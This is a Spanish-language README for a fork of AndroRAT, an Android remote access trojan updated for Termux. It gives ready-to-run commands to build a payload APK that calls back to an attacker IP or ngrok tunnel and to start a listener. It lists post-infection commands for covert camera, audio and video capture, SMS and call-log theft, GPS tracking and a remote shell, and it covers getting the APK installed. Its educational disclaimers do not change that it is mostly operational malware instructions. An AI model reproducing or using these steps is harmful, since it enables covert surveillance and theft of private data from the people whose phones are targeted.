# AndroRAT - Remote Administration Tool for Android

> **Fork actualizado y optimizado del proyecto original de [karma9874/AndroRAT](https://github.com/karma9874/AndroRAT)**

**Versión 2.0 - Optimizada para Termux sin root**

## 🔄 Cambios en este Fork

Esta versión incluye mejoras significativas sobre el proyecto original:

- ✅ **Gradle actualizado**: 3.5.3 → 8.1.4
- ✅ **SDK de Android**: 29 → 34 (Android 14)
- ✅ **Compatibilidad ampliada**: Android 5.0 a 14
- ✅ **Dependencias actualizadas**: Versiones 2024
- ✅ **Optimizado para Termux**: Sin root requerido
- ✅ **Mejor manejo de errores**: Ngrok, zipalign, etc.
- ✅ **Firmas modernas**: V1, V2, V3
- ✅ **Documentación mejorada**: SIGNING.md incluido

## ⚠️ Descargo de Responsabilidad

Esta herramienta es solo para **fines educativos y de investigación de seguridad**. El uso indebido de esta herramienta puede violar las leyes locales y nacionales. Los autores no se hacen responsables del mal uso.

## ✨ Características

- 📱 Control remoto de dispositivos Android
- 📸 Captura de cámara (frontal y trasera)
- 🎤 Grabación de audio
- 📹 Grabación de video
- 📍 Obtención de ubicación GPS
- 📞 Acceso a registros de llamadas
- 💬 Lectura de SMS (inbox/sent)
- 🔔 Control de vibración
- 💻 Shell interactivo del dispositivo
- 📋 Acceso al portapapeles
- 🌐 Soporte de ngrok para conexión remota

## 📋 Requisitos

### En Termux (Android)

```bash
pkg update && pkg upgrade
pkg install python openjdk-17 git
```

### Python

Versión recomendada: Python 3.6 - 3.11 (compatible con 3.12)

```bash
python --version
```

## 🚀 Instalación

```bash
# Clonar este fork
git clone https://github.com/Darkrevengehack/AndroRAT.git
cd AndroRAT

# Instalar dependencias
pip install -r requirements.txt
```

## 🔨 Uso Básico

### Compilar APK

```bash
# Con IP y puerto local
python3 androRAT.py --build -i 192.168.1.100 -p 4444 -o payload.apk

# Con ngrok (túnel público)
python3 androRAT.py --build --ngrok -p 8000 -o payload.apk

# Con icono visible
python3 androRAT.py --build -i 192.168.1.100 -p 4444 -o payload.apk -icon
```

### Iniciar Listener

```bash
python3 androRAT.py --shell -i 0.0.0.0 -p 4444
```

Espera a que el dispositivo objetivo se conecte.

## 📱 Comandos Disponibles

Una vez conectado al dispositivo:

```
deviceInfo          - Información básica del dispositivo
camList             - Listar IDs de cámaras disponibles
takepic [cameraID]  - Tomar fotografía
startVideo [ID]     - Iniciar grabación de video
stopVideo           - Detener grabación y descargar
startAudio          - Iniciar grabación de audio
stopAudio           - Detener audio y descargar
getSMS [inbox|sent] - Obtener mensajes SMS
getCallLogs         - Obtener registros de llamadas
shell               - Abrir shell interactivo
vibrate [times]     - Vibrar el dispositivo
getLocation         - Obtener ubicación GPS
getIP               - Obtener dirección IP
getSimDetails       - Detalles de tarjetas SIM
getClipData         - Contenido del portapapeles
getMACAddress       - Dirección MAC
clear               - Limpiar pantalla
exit                - Cerrar conexión
```

## 🔐 Firma de APK

AndroRAT firma automáticamente los APKs generados con un certificado de debug incluido en `sign.jar`.

**Para crear tu propio certificado personalizado:**

Ver [SIGNING.md](SIGNING.md) para instrucciones completas.

```bash
keytool -genkeypair -v -keystore my-key.jks \
  -keyalg RSA -keysize 2048 -validity 10000 \
  -alias my-alias
```

## 📁 Estructura del Proyecto

```
AndroRAT/
├── androRAT.py              # Script principal
├── utils.py                 # Funciones auxiliares
├── requirements.txt         # Dependencias Python
├── SIGNING.md              # Guía de firmas
├── Android_Code/           # Código fuente Android
│   ├── app/
│   │   ├── src/
│   │   └── build.gradle    # Configuración de app (SDK 34)
│   ├── build.gradle        # Configuración de proyecto (Gradle 8.1.4)
│   └── gradle.properties   # Propiedades optimizadas
├── Compiled_apk/           # APK base descompilado
│   ├── smali/              # Código smali
│   └── res/                # Recursos
├── Jar_utils/              # Herramientas
│   ├── apktool.jar         # Compilador/descompilador
│   └── sign.jar            # Firmador (Uber APK Signer)
├── Dumps/                  # Archivos capturados
└── Screenshots/            # Capturas del proyecto
```

## 🐛 Troubleshooting

### Error: "could not execute zipalign"

**Normal en Termux.** El APK funciona correctamente sin zipalign. El mensaje es solo un warning.

### Error: "ERR_NGROK_108"

Tu cuenta ngrok está limitada a 1 sesión simultánea.

**Solución:**
```bash
pkill ngrok  # Cierra sesiones previas
```

O usa IP/puerto manual en lugar de ngrok.

### APK no se instala

- Habilita "Instalar desde fuentes desconocidas" en Android
- Verifica que el APK esté firmado correctamente:
  ```bash
  java -jar Jar_utils/sign.jar -y payload.apk
  ```

### Python version warning

Si ves un warning sobre la versión de Python, es solo informativo. Funciona con Python 3.6-3.12.

## 🔧 Desarrollo

### Compilación manual con Gradle

```bash
cd Android_Code
./gradlew clean assembleRelease

# El APK estará en:
# app/build/outputs/apk/release/app-release.apk
```

### Limpiar cache

```bash
rm -rf .gradle Android_Code/.gradle Android_Code/app/build
```

## 📝 Changelog

### v2.0 (2024) - Este Fork
- ✨ Actualización completa de Gradle (8.1.4)
- ✨ SDK de Android 34 (Android 14)
- ✨ Compatibilidad Python 3.12
- ✨ Optimizaciones para Termux
- ✨ Firma APK V3
- ✨ Documentación mejorada
- 🐛 Corrección de SyntaxWarning
- 🐛 Mejor manejo de errores ngrok
- 🐛 Manejo de zipalign en Termux

### v1.0 (2020) - Original
- 🎉 Versión inicial por karma9874

## 🤝 Contribuir

Las contribuciones son bienvenidas. Por favor:

1. Fork el proyecto
2. Crea una rama (`git checkout -b feature/mejora`)
3. Commit tus cambios (`git commit -am 'Agregar mejora'`)
4. Push a la rama (`git push origin feature/mejora`)
5. Abre un Pull Request

## 📄 Licencia

Este proyecto mantiene la licencia del proyecto original.

## 👤 Créditos

- **Proyecto Original**: [karma9874](https://github.com/karma9874/AndroRAT)
- **Fork y Actualizaciones v2.0**: Darkrevengehack
- **Herramientas Utilizadas**:
  - [Uber APK Signer](https://github.com/patrickfav/uber-apk-signer) por Patrick Favre
  - [Apktool](https://github.com/iBotPeaches/Apktool)
  - [pyngrok](https://github.com/alexdlaird/pyngrok)

## ⚖️ Uso Legal

Esta herramienta es únicamente para:

✅ **Permitido:**
- Pruebas de seguridad autorizadas
- Investigación educativa
- Auditorías de seguridad con permiso explícito
- Pruebas en dispositivos propios

❌ **Prohibido:**
- Acceso no autorizado a dispositivos
- Vigilancia ilegal
- Robo de información
- Distribución maliciosa

**El mal uso es responsabilidad del usuario final.**

## 🔗 Enlaces

- [Proyecto Original](https://github.com/karma9874/AndroRAT)
- [Documentación de Android](https://developer.android.com/)
- [Termux Wiki](https://wiki.termux.com/)
- [APK Signature Scheme](https://source.android.com/security/apksigning)
- [Guía de Firmas](SIGNING.md)

---

⭐ Si este fork te resultó útil, considera dar una estrella al proyecto!
